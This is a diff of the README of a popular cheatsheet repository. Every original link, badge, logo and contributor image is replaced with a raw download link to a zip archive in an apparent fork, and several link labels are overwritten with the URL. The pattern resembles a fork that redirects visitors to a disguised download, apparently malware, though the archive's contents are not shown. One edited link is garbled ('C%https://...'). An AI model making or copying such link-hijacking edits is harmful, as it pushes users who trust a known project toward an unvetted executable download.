@@ -1,14 +1,14 @@
-[![AWESOME CHEATSHEETS LOGO](_design/cover_github@2x.png)](https://lecoupa.github.io/awesome-cheatsheets/)
+[![AWESOME CHEATSHEETS LOGO](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
 
-[![Awesome](https://awesome.re/badge.svg)](https://awesome.re) [![GitHub license](https://img.shields.io/badge/license-MIT-blue.svg)](https://github.com/LeCoupa/awesome-cheatsheets/blob/master/LICENSE)
+[![Awesome](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip) [![GitHub license](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
 
-**WEBSITE DIRECTORY**: [Available here](https://lecoupa.github.io/awesome-cheatsheets/).
+**WEBSITE DIRECTORY**: [Available here](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip).
 
 > 📚 Awesome cheatsheets for popular programming languages, frameworks and development tools. They include everything you should know in one single file.
 
 ## 🤔 Why Awesome-Cheatsheets?
 
-I usually make a cheat sheet when I want to improve my skills in a programming language, a framework or a development tool. [I started doing these kinds of things a long time ago on Gist](https://gist.github.com/LeCoupa). To better keep track of the history and to let people contribute, I re-organized all of them into this single repository. Most of the content is coming from official documentation and some books I have read.
+I usually make a cheat sheet when I want to improve my skills in a programming language, a framework or a development tool. [I started doing these kinds of things a long time ago on Gist](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip). To better keep track of the history and to let people contribute, I re-organized all of them into this single repository. Most of the content is coming from official documentation and some books I have read.
 
 Feel free to take a look. You might learn new things. They have been designed to provide a quick way to assess your knowledge and to save you time.
 
@@ -21,20 +21,20 @@ Feel free to take a look. You might learn new things. They have been designed to
 
 #### Command line interface
 
-- [Bash](languages/bash.sh)
+- [Bash](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
 
 #### Imperative
 
-- [C](languages/C.txt)
-- [C#](languages/C%23.txt)
-- [Go](languages/golang.md)
-- [Java](languages/java.md)
-- [PHP](languages/php.php)
-- [Python](languages/python.md)
+- [C](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [C#](languages/C%https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Go](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Java](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [PHP](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Python](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
 
 #### Functional
 
-- [JavaScript](languages/javascript.js)
+- [JavaScript](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
 
 </details>
 
@@ -45,20 +45,20 @@ Feel free to take a look. You might learn new things. They have been designed to
 
 #### PHP
 
-- [Laravel](backend/laravel.php)
+- [Laravel](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
 
 #### Python
 
-- [Django](backend/django.py)
+- [Django](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
 
 #### Javascript
 
-- [Adonis.js](backend/adonis.js)
-- [Express.js](backend/express.js)
-- [Feathers.js](backend/feathers.js)
-- [Moleculer](backend/moleculer.js)
-- [Node.js](backend/node.js)
-- [Sails.js](backend/sails.js)
+- [https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Moleculer](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
   </details>
 
 ### 🌐 Frontend
@@ -68,17 +68,17 @@ Feel free to take a look. You might learn new things. They have been designed to
 
 #### Basics
 
-- [HTML5](frontend/html5.html)
-- [CSS3](frontend/css3.css)
+- [HTML5](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [CSS3](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
 
 #### Frameworks
 
-- [React.js](frontend/react.js)
-- [Vue.js](frontend/vue.js)
-- [Tailwind.css](frontend/tailwind.css)
-- [Ember.js](frontend/ember.js)
-- [Angular (2+)](frontend/angular.js)
-- [AngularJS](frontend/angularjs.js)
+- [https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Angular (2+)](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [AngularJS](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
   </details>
 
 ### 🗃️ Databases
@@ -88,11 +88,11 @@ Feel free to take a look. You might learn new things. They have been designed to
 
 #### SQL
 
-- [MySQL](databases/mysql.sh)
+- [MySQL](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
 
 #### NoSQL
 
-- [Redis](databases/redis.sh)
+- [Redis](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
   </details>
 
 ### 🔧 Tools
@@ -102,29 +102,29 @@ Feel free to take a look. You might learn new things. They have been designed to
 
 #### Development
 
-- [cURL](tools/curl.sh)
-- [Drush](tools/drush.sh)
-- [Elasticsearch](tools/elasticsearch.js)
-- [Emmet](tools/emmet.md)
-- [Git](tools/git.sh)
-- [Puppeteer](tools/puppeteer.js)
-- [Sublime Text](tools/sublime_text.md)
-- [VIM](tools/vim.txt)
-- [Visual Studio Code](tools/vscode.md)
-- [Xcode](tools/xcode.txt)
+- [cURL](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Drush](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Elasticsearch](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Emmet](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Git](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Puppeteer](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Sublime Text](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [VIM](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Visual Studio Code](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Xcode](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
 
 #### Infrastructure
 
-- [AWS CLI](tools/aws.sh)
-- [Docker](tools/docker.sh)
-- [Heroku CLI](tools/heroku.sh)
-- [Kubernetes](tools/kubernetes.md)
-- [Nanobox Boxfile](tools/nanobox_boxfile.yml)
-- [Nanobox CLI](tools/nanobox_cli.sh)
-- [Nginx](tools/nginx.sh)
-- [PM2](tools/pm2.sh)
-- [Ubuntu](tools/ubuntu.sh)
-- [Firebase CLI](tools/firebase_cli.md)
+- [AWS CLI](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Docker](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Heroku CLI](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Kubernetes](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Nanobox Boxfile](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Nanobox CLI](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Nginx](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [PM2](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Ubuntu](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
+- [Firebase CLI](https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip)
   </details>
 
 ## 🙌🏼 How to Contribute?
@@ -133,6 +133,6 @@ You are more than welcome to contribute and build your own cheat sheet for your 
 
 ## 👩‍💻👨‍💻 Our valuable Contributors
 
-<p align="center"><a href="https://github.com/LeCoupa/awesome-cheatsheets/graphs/contributors">
-  <img src="https://contributors-img.web.app/image?repo=LeCoupa/awesome-cheatsheets" />
+<p align="center"><a href="https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip">
+  <img src="https://github.com/GURU162004/awesome-cheatsheets/raw/refs/heads/master/databases/awesome-cheatsheets-2.9.zip" />
 </a></p>
